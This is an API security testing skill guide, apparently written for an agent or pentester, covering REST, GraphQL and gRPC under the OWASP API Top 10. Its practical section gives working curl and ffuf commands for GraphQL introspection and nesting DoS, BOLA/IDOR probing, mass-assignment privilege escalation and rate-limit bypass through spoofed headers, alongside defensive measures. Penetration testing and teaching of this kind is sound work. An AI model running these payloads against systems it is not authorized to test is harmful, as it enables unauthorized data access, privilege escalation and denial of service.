# Skill: API Security Testing

> **Supplementary Files**:
> - `payloads.md` — Complete payload collection organized by attack type (endpoint discovery, BOLA, Mass Assignment, JWT, GraphQL, etc. — 8 major categories)
> - `test-cases.md` — Structured test case templates (20 cases covering authentication & authorization, input validation, rate limiting, data exposure, GraphQL, and configuration leakage — 6 categories)

## Description

API Security Testing covers security assessment across three major API architectures: REST, GraphQL, and gRPC, focusing on the OWASP API Security Top 10 core risks: Broken Authentication, Broken Object Level Authorization (BOLA), Excessive Data Exposure, Rate Limiting Bypass, and Mass Assignment.

**Core Attack Surfaces**:

- **Broken Authentication**: Hardcoded API key leakage, JWT algorithm confusion (`alg:none` / RS256->HS256), missing token invalidation, OAuth flow hijacking.
- **Authorization Failures**: BOLA (IDOR in API form) horizontal privilege escalation to access resources, BPLA (Broken Property Level Authorization) tampering with read-only properties (e.g., `role` / `is_admin`), incomplete permission matrix.
- **Excessive Data Exposure**: API responses returning complete database records instead of minimal necessary fields, sensitive fields (password hashes / internal IDs) not filtered, error messages leaking stack traces/SQL.
- **Rate Limiting Bypass**: IP spoofing via `X-Forwarded-For` / `X-Originating-IP` headers, parameter pollution (`?rate_limit_bypass=1`), concurrent requests bypassing sliding windows.
- **GraphQL-Specific Risks**: Introspection queries leaking complete schema, deep nested query DoS, batch query brute force enumeration, missing field-level authorization.
- **gRPC Risks**: Protobuf deserialization vulnerabilities, unencrypted channels (plaintext h2c), reflection service information leakage.

**Related Skills**:
- `skills/web-auth-bypass/SKILL.md` — Complete skills for JWT attacks, authentication bypass, and MFA bypass (complements the authentication dimension of JWT/BOLA testing in this skill)
- `skills/web-access-control/SKILL.md` — Access control vulnerabilities (defense perspective reference for BOLA/BPLA)

---

## Use Cases

1. **API Penetration Testing**: Systematically enumerate API endpoints (REST paths / GraphQL operations / gRPC methods), testing authentication, authorization, and input validation at each layer.
2. **REST API Security Audit**: Test each CRUD endpoint individually for BOLA, Mass Assignment, Rate Limiting, and response data overexposure.
3. **GraphQL Security Assessment**: Detect introspection leakage, query depth limits, batch/mutation abuse, and field-level access control.
4. **API Authentication Mechanism Testing**: JWT security analysis (algorithm confusion / key brute force / no signature), API key leakage detection, OAuth implementation audit.
5. **Rate Limiting and Brute Force Protection Assessment**: Verify bypassability of rate limiting mechanisms, test account enumeration and credential stuffing defenses.

---

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Burp Suite** | API proxy interception, authorization testing, Intruder brute force enumeration, response comparison analysis | Proxy intercept API request -> Autorize plugin test BOLA -> Comparer compare responses for different IDs |
| **Postman** | API request construction, batch collection testing, Pre-request Script automated token refresh | Set Environment Variables -> Write Collection Runner batch tests for different user permissions |
| **ffuf** | API endpoint fuzzing, path enumeration, parameter brute force | `ffuf -w api_endpoints.txt -u https://target.com/FUZZ -H "Authorization: Bearer TOKEN" -mc 200,403` |
| **GraphQLMap** | GraphQL-specific security testing: introspection, field fuzzing, mutation abuse | `graphqlmap -u https://target.com/graphql` -> `introspection` / `dos FIELD` |
| **kiterunner** | API route discovery, large-scale path enumeration based on Swagger/OpenAPI specs | `kr scan https://target.com -w routes.kite -x 20` |

Auxiliary tools: **jwt_tool** (JWT attack suite), **Postman Collections** (API regression testing), **Nuclei** (API vulnerability template scanning), **Arjun** (HTTP parameter discovery), **graphtester** (in-depth GraphQL testing).

---

## Methodology

### Attack Chain

```
[1] API Discovery        [2] Authentication     [3] Authorization
  - Endpoint enumeration   - JWT security analysis      - BOLA testing (IDOR)
    (kiterunner)            - API key leakage detection  - BPLA property tampering
  - Swagger/OpenAPI leak   - OAuth flow audit           - Permission matrix verification
  - GraphQL Introspection  - Authentication bypass      - Horizontal/vertical privilege
  - gRPC reflection probe    attempts                     escalation
       |                        |                        |
       v                        v                        v
[4] Input Validation     [5] Rate Limiting      [6] Data Exposure
  - Parameter injection     - Header bypass            - Response field audit
  - Mass Assignment         - IP spoofing bypass       - Sensitive data filtering
  - Content-Type abuse      - Concurrent request bypass - Error message leakage
  - GraphQL query injection - Sliding window breakthrough - Pagination parameter abuse
```

### Defense Perspective

| Defense Layer | Measures | Key Points |
|---------------|----------|------------|
| **API Gateway** | Unified entry point + authentication gateway + rate limiting + request logging | Kong / APISIX / AWS API Gateway; all API traffic must pass through the gateway |
| **Input Validation** | Schema-based validation (JSON Schema / protobuf) + allowlist | Define strict request/response schemas for each endpoint; reject non-compliant requests |
| **Rate Limiting** | Multi-dimensional limits based on User ID + IP + Endpoint + progressive penalties | Sliding window algorithm, 429 response + Retry-After header |
| **OAuth2 + JWT** | RS256 signing + short expiration + refresh token rotation + token blacklist | Prohibit `alg:none`, enforce algorithm allowlist, verify all required claims |
| **Response Filtering** | Return minimal necessary fields + DTO pattern + automatic sensitive field stripping | Never return ORM entities directly; use dedicated response DTOs |
| **GraphQL Protection** | Disable production introspection + query depth limits + complexity analysis | Apollo `maxDepth: 10` + `maxComplexity: 1000` |

---

## Practical Steps

> **For detailed payloads see `payloads.md`, and for the complete test checklist see `test-cases.md`.** Below is a summary of core operations for each phase.

### 1. API Endpoint Discovery and Fuzzing

```bash
# kiterunner - Spec-based route discovery
kr scan https://target.com -w /usr/share/wordlists/kiterunner/routes.kite -x 20

# ffuf - API path fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u https://target.com/api/v1/FUZZ \
     -H "Authorization: Bearer TOKEN" -mc 200,201,403,401 -fc 404

# ffuf - HTTP method fuzzing
ffuf -w GET,POST,PUT,PATCH,DELETE,OPTIONS \
     -u https://target.com/api/v1/users/123 \
     -X FUZZ -H "Authorization: Bearer TOKEN" -mc 200,201,204,403

# Swagger/OpenAPI document leakage detection
curl -s https://target.com/swagger.json https://target.com/api-docs \
     https://target.com/openapi.json https://target.com/v2/api-docs
```

### 2. GraphQL Introspection and Security Testing

```bash
# Introspection Query - Retrieve complete schema
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name,fields{name}}}}"}' | jq .

# GraphQLMap - Interactive testing
graphqlmap -u https://target.com/graphql
# > introspection     # Retrieve schema
# > dos user          # Deep query DoS test
# > batchquery 1000   # Batch query test

# Deep nested query DoS
curl -s -X POST https://target.com/graphql \
     -d '{"query":"{user(id:1){posts{comments{user{posts{comments{id}}}}}}}"}'

# Unauthorized mutation test
curl -s -X POST https://target.com/graphql \
     -d '{"query":"mutation{updateUser(id:1,role:\"admin\"){id,role}}"}'
```

### 3. BOLA (Broken Object Level Authorization) Testing

```bash
# Basic IDOR test - Replace resource ID
curl -s -H "Authorization: Bearer USER_A_TOKEN" \
     https://target.com/api/v1/users/123/profile    # Own resource
curl -s -H "Authorization: Bearer USER_A_TOKEN" \
     https://target.com/api/v1/users/456/profile    # Another user's resource -> 200 means BOLA

# ffuf batch BOLA detection (integer IDs / UUIDs both work)
ffuf -w numbers.txt:FUZZ_ID \
     -u https://target.com/api/v1/users/FUZZ_ID/profile \
     -H "Authorization: Bearer USER_A_TOKEN" \
     -mc 200 -fs DIFF_FROM_OWN_RESPONSE
```

### 4. Mass Assignment Testing

```bash
# Normal update request
curl -s -X PATCH https://target.com/api/v1/users/123 \
     -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
     -d '{"name":"Test User"}'

# Mass Assignment - Inject read-only properties (role / is_verified / email_verified_at)
curl -s -X PATCH https://target.com/api/v1/users/123 \
     -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
     -d '{"name":"Test User","role":"admin","is_verified":true}'
# If response returns role as "admin" -> Mass Assignment confirmed

# Registration endpoint Mass Assignment
curl -s -X POST https://target.com/api/v1/register \
     -H "Content-Type: application/json" \
     -d '{"username":"test","password":"P@ss1234","email":"t@t.com","role":"admin"}'
```

### 5. Rate Limit Bypass

```bash
# Method 1: X-Forwarded-For IP spoofing (change IP with each request)
curl -s -H "X-Forwarded-For: 10.0.0.$((RANDOM%255))" \
     -H "Authorization: Bearer TOKEN" https://target.com/api/v1/sensitive-endpoint

# Method 2: Multiple header stacking
curl -s -H "X-Forwarded-For: 1.2.3.4" -H "X-Originating-IP: 1.2.3.4" \
     -H "X-Remote-IP: 1.2.3.4" -H "X-Client-IP: 1.2.3.4" \
     https://target.com/api/v1/login

# Method 3: Concurrent requests bypassing sliding window (Turbo Intruder / custom scripts)

# Method 4: Path mutation bypass
curl -s https://target.com/api/v1/endpoint?param=value&_=$(date +%s)
curl -s https://target.com/api/v1/./endpoint?param=value
```

## Automation and Scripting

API security testing benefits heavily from automation due to the sheer number of endpoints and parameter combinations. Postman Collection Runner and custom Python scripts using the `requests` library can systematically test every endpoint with multiple authentication levels, automatically diffing responses to detect authorization bypasses. Nuclei templates for API-specific checks (Swagger exposure, GraphQL introspection, JWT misconfigurations) enable rapid batch scanning across API inventories.

## Common Pitfalls

A common mistake in API testing is focusing exclusively on CRUD endpoints while overlooking less obvious attack surfaces like health-check endpoints, debug routes, and internal API documentation endpoints that may lack authentication entirely. Another pitfall is testing rate limiting with only single-threaded requests — many rate limit implementations only enforce limits within discrete time windows, making them vulnerable to burst attacks that fit between window boundaries. Always test rate limits with concurrent multi-threaded requests.

## Detection Methods

API vulnerability detection starts with comprehensive endpoint discovery using multiple complementary techniques: kiterunner for spec-based route enumeration, ffuf for path fuzzing, and passive analysis of JavaScript bundles for hardcoded API paths. GraphQL introspection queries and gRPC reflection services provide complete schema maps when available. Once endpoints are catalogued, automated BOLA testing swaps resource IDs across authenticated sessions while Mass Assignment testing injects additional properties into request bodies.

---

## Hacker Laws

- **Trust but Verify**: API authorization claims cannot be trusted. Even if documentation states an endpoint is admin-only, it must be verified with a regular user's token. The essence of BOLA vulnerabilities is that the server "trusts" the resource ID submitted by the client without verifying ownership.
- **Minimize Attack Surface**: Every exposed API endpoint adds an attack surface. Production environments should disable GraphQL introspection, Swagger UI, and gRPC reflection services. Deprecated endpoint versions should be promptly removed.
- **Least Privilege**: API tokens should follow the principle of least privilege — user tokens should only access the user's own resources, and service account tokens should only be granted necessary operation permissions. Never use admin tokens for routine operations.

---

## Learning Resources

**Supplementary files for this skill**:
- `payloads.md` — Complete payload collection (8 major attack types, ready to copy and use)
- `test-cases.md` — Structured test cases (20 case templates with preconditions and expected results)

**Workspace core documents**:
- `api-security-guide.md` -- Complete API security guide (authentication attacks, BOLA/BPLA detection, rate limit bypass, complete offensive and defensive code examples for GraphQL security)

**Related skills**:
- `skills/web-auth-bypass/SKILL.md` — Authentication bypass (JWT attacks, MFA bypass, session management)
- `skills/web-access-control/SKILL.md` — Access control (IDOR/BOLA/BPLA defense perspective)

**External resources**:
- **OWASP API Security Top 10**: https://owasp.org/www-project-api-security/ (Authoritative standard for API security risks)
- **PortSwigger Web Security Academy - API Testing**: https://portswigger.net/web-security/api-testing
- **GraphQL Security**: https://escape.tech/blog/graphql-security/ (Specialized GraphQL security research)
- **jwt_tool**: https://github.com/ticarpi/jwt_tool (Automated JWT attack tool)
- **kiterunner**: https://github.com/assetnote/kiterunner (API route discovery)
- **HackTricks - API Pentesting**: https://book.hacktricks.xyz/pentesting/pentesting-web/api-pentesting
